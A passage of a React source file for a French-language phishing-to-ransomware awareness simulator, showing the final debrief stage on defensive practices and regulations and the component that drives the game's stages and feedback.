      wrongFeedback: 'Rançon envoyée. Le paiement en Bitcoin est tracé — le DOJ a déjà récupéré des rançons dans des cas similaires (Colonial Pipeline, 2021). 65% de chance de récupérer les données. Vous êtes maintenant sur la liste des "payeurs" — vous serez refrappé. Coût total : ~89 000€. Arrêt : 11 jours.',
    },
    {
      id: 'bilan',
      chapter: 'ACTE 6 / 6',
      title: 'Bilan & bonnes pratiques',
      instruction: '',
      story: [
        'Cette simulation est terminée. Voici les **5 réflexes** qui auraient tout évité : vérifier l\'expéditeur par un autre canal · ne jamais ouvrir une pièce jointe inattendue · activer la MFA sur tous les comptes · maintenir des sauvegardes hors-ligne testées · former les équipes régulièrement.',
        '**Cadre réglementaire** : RGPD Art.33 (notification CNIL sous 72h) · NIS2 2024 (directive européenne, transposée en France, ~15 000 entités concernées) · LOPMI 2023 (assurance rançon) · Référentiel PSSI-E de l\'ANSSI.',
        'La **Cyber Kill Chain** (Lockheed Martin) modélise les 7 phases d\'une attaque : Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions. Rompre une seule étape suffit à stopper l\'attaque.',
      ],
      knowledge: [
        { term: 'MFA — Multi-Factor Authentication', definition: 'Authentification par au moins deux facteurs (mot de passe + code app). Bloque 99,9% des attaques automatisées sur les comptes (Microsoft, 2023).', law: 'ANSSI recommande les apps TOTP (Google Authenticator, FreeOTP) plutôt que les SMS, vulnérables au SIM swapping.' },
        { term: 'NIS2 (2024)', definition: 'Directive européenne Network and Information Security 2, transposée en France fin 2024. Étend les obligations à ~15 000 entités. Notification d\'incident sous 24h, sous 72h pour rapport détaillé.', law: 'Entités "essentielles" et "importantes" : énergie, santé, transport, finance, eau, infrastructures numériques. Amendes : jusqu\'à 10M€ ou 2% CA mondial.' },
        { term: 'Cyber Kill Chain', definition: 'Modèle Lockheed Martin (2011) décrivant les 7 phases d\'une cyberattaque. Objectif défensif : identifier à quelle phase on peut rompre la chaîne pour stopper l\'attaque au plus tôt.', example: 'Stade idéal de rupture : phase 3 (Delivery) — bloquer le phishing avant exécution. C\'est là que la formation des utilisateurs est décisive.' },
        { term: 'No More Ransom', definition: 'Projet Europol + ANSSI + partenaires privés. Bibliothèque de 130+ outils de déchiffrement gratuits pour les ransomwares connus. 1,5 milliard € de rançons évitées depuis 2016.', law: 'nomoreransom.org — toujours vérifier ici avant toute décision de paiement.' },
      ],
      screen: ({ onAction, state }) => <BilanScreen onAction={onAction} state={state} good={goodChoices} />,
      correctAction: 'restart',
      correctFeedback: '',
    },
  ];
}

// ─── Main ──────────────────────────────────────────────────────────────────────

export default function AttackSimulator() {
  const [, navigate] = useLocation();
  const [actIndex, setActIndex] = useState(0);
  const [choices, setChoices] = useState<Record<string, string>>({});
  const [stageStates, setStageStates] = useState<Record<string, StageState>>({});
  const [feedbacks, setFeedbacks] = useState<Record<string, { correct: boolean; text: string }>>({});

  const stages = buildStages(choices);
  const stage = stages[actIndex];
  const isLast = actIndex === stages.length - 1;
  const currentState: StageState = stageStates[stage.id] || 'waiting';
  const canAdvance = currentState === 'correct' || currentState === 'wrong' || currentState === 'auto';

  const handleAction = (actionId: string) => {
    if (currentState !== 'waiting') return;
    const isCorrect = actionId === stage.correctAction;
    const isWrong = stage.wrongActions?.includes(actionId);

    if (isCorrect) {
      setStageStates(prev => ({ ...prev, [stage.id]: 'correct' }));
      setChoices(prev => ({ ...prev, [stage.id]: actionId }));
      setFeedbacks(prev => ({ ...prev, [stage.id]: { correct: true, text: stage.correctFeedback } }));
    } else if (isWrong) {
      setStageStates(prev => ({ ...prev, [stage.id]: 'wrong' }));
      setChoices(prev => ({ ...prev, [stage.id]: actionId }));
      if (stage.wrongFeedback) {
        setFeedbacks(prev => ({ ...prev, [stage.id]: { correct: false, text: stage.wrongFeedback! } }));
      }
    }
  };

  const advance = () => {
    if (!isLast) setActIndex(i => i + 1);
    else {
      setActIndex(0);
      setChoices({});
      setStageStates({});
      setFeedbacks({});
    }
  };

  const ScreenComp = stage.screen;
  const feedback = feedbacks[stage.id];

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', background: T.bg, fontFamily: T.SANS, color: T.text, overflow: 'hidden' }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #e8eaed; border-radius: 2px; }
      `}</style>

      {/* Top bar */}
      <div style={{ borderBottom: `1px solid ${T.line}`, padding: '10px 28px', display: 'flex', alignItems: 'center', gap: 14, background: T.bg, flexShrink: 0 }}>
        <button onClick={() => navigate('/cyber/sas-academie')} style={{ display: 'flex', alignItems: 'center', gap: 5, background: 'none', border: 'none', cursor: 'pointer', color: T.muted, fontSize: 10, fontFamily: T.MONO, padding: 0 }}>
          <ChevronLeft size={11} /> Retour
        </button>
        <div style={{ width: 1, height: 14, background: T.line }} />
        <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.blue, textTransform: 'uppercase', letterSpacing: '0.1em' }}>PHISHING → RANSOMWARE</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 5, alignItems: 'center' }}>
          {stages.map((s, i) => {
            const st = stageStates[s.id];
            const color = st === 'correct' ? T.green : st === 'wrong' ? T.red : i === actIndex ? T.blue : T.line;
            return <div key={i} style={{ width: i === actIndex ? 22 : 7, height: 7, background: color, transition: 'all 0.3s' }} />;
          })}
        </div>
      </div>

      {/* Body */}
      <div style={{ flex: 1, display: 'grid', gridTemplateColumns: '1fr 400px', overflow: 'hidden' }}>

        {/* LEFT — Interactive screen */}
        <div style={{ borderRight: `1px solid ${T.line}`, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          {/* Instruction banner */}
          {stage.instruction && (
            <div style={{ borderBottom: `1px solid ${T.line}`, padding: '8px 20px', background: T.surface, flexShrink: 0 }}>
              <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.blue }}>{stage.instruction}</span>
            </div>
          )}

          {/* Screen itself */}
          <div style={{ flex: 1, overflow: 'hidden' }}>
            <AnimatePresence mode="wait">
              <motion.div key={stage.id} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.25 }} style={{ height: '100%' }}>
                <ScreenComp onAction={handleAction} state={currentState} />
              </motion.div>
            </AnimatePresence>
          </div>

          {/* Feedback bar */}
          <AnimatePresence>
            {feedback && (
              <motion.div
                initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }}
                style={{
                  borderTop: `2px solid ${feedback.correct ? T.green : T.red}`,
                  background: feedback.correct ? 'rgba(16,185,129,0.05)' : 'rgba(239,68,68,0.05)',
                  padding: '12px 20px', flexShrink: 0,
                }}
              >
                <div style={{ display: 'flex', gap: 10, alignItems: 'flex-start' }}>
                  {feedback.correct ? <CheckCircle size={14} color={T.green} style={{ flexShrink: 0, marginTop: 1 }} /> : <XCircle size={14} color={T.red} style={{ flexShrink: 0, marginTop: 1 }} />}
                  <div>
                    <span style={{ fontFamily: T.MONO, fontSize: 9, fontWeight: 700, color: feedback.correct ? T.green : T.red, textTransform: 'uppercase', letterSpacing: '0.06em', display: 'block', marginBottom: 4 }}>
                      {feedback.correct ? '✓ Bonne décision' : '✗ Mauvaise décision'}
                    </span>
                    <span style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.6 }}>{feedback.text}</span>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* RIGHT — Narration + knowledge */}
        <div style={{ display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          <div style={{ flex: 1, overflowY: 'auto', padding: '24px 24px 0' }}>

            {/* Chapter + title */}
            <div style={{ marginBottom: 18 }}>
              <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{stage.chapter}</span>
              <h2 style={{ fontFamily: T.SANS, fontWeight: 800, fontSize: '1.1rem', letterSpacing: '-0.03em', color: T.text, margin: '5px 0 0', lineHeight: 1.25 }}>{stage.title}</h2>
            </div>

            {/* Story */}
            <div style={{ marginBottom: 22 }}>
              {stage.story.map((para, i) => {
                const parts = para.split(/\*\*(.*?)\*\*/g);
                return (
                  <p key={i} style={{ fontSize: 13, color: T.sub, lineHeight: 1.75, margin: '0 0 10px' }}>
                    {parts.map((part, j) => j % 2 === 1
                      ? <strong key={j} style={{ color: T.text, fontWeight: 600 }}>{part}</strong>
                      : <span key={j}>{part}</span>
                    )}
                  </p>
                );
              })}
            </div>

            {/* Knowledge cards */}
            {stage.knowledge && (
              <div style={{ marginBottom: 24 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                  <Info size={10} color={T.blue} />
                  <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue }}>À RETENIR</span>
                </div>
                <KnowledgePanel cards={stage.knowledge} />
              </div>
            )}
          </div>

          {/* Bottom nav */}
          <div style={{ borderTop: `1px solid ${T.line}`, padding: '14px 24px', display: 'flex', gap: 10, alignItems: 'center', background: T.bg, flexShrink: 0 }}>
            <button
              onClick={() => actIndex > 0 && setActIndex(i => i - 1)}
              disabled={actIndex === 0}
              style={{ display: 'flex', alignItems: 'center', gap: 5, padding: '8px 12px', background: T.surface, border: `1px solid ${T.line}`, cursor: actIndex === 0 ? 'not-allowed' : 'pointer', opacity: actIndex === 0 ? 0.35 : 1, fontFamily: T.MONO, fontSize: 10, color: T.sub }}
            >
              <ChevronLeft size={11} /> Précédent
            </button>

            <motion.button
              onClick={advance}
              disabled={!canAdvance}
              whileHover={canAdvance ? { scale: 1.02 } : {}}
              style={{
                flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                padding: '10px 16px',
                background: canAdvance ? T.blue : T.surface,
                color: canAdvance ? '#fff' : T.muted,
                border: canAdvance ? 'none' : `1px solid ${T.line}`,
                cursor: canAdvance ? 'pointer' : 'not-allowed',
                fontFamily: T.MONO, fontSize: 11, fontWeight: 600,
              }}
            >
              {!canAdvance ? (
                <><motion.span animate={{ opacity: [1, 0.3] }} transition={{ repeat: Infinity, duration: 0.9 }}>●</motion.span> Interagissez avec l'écran</>
              ) : isLast ? (
                <><RotateCcw size={12} /> Recommencer</>
              ) : (
                <>Acte suivant <ChevronRight size={12} /></>
              )}
            </motion.button>
          </div>
        </div>
      </div>
    </div>
  );
}
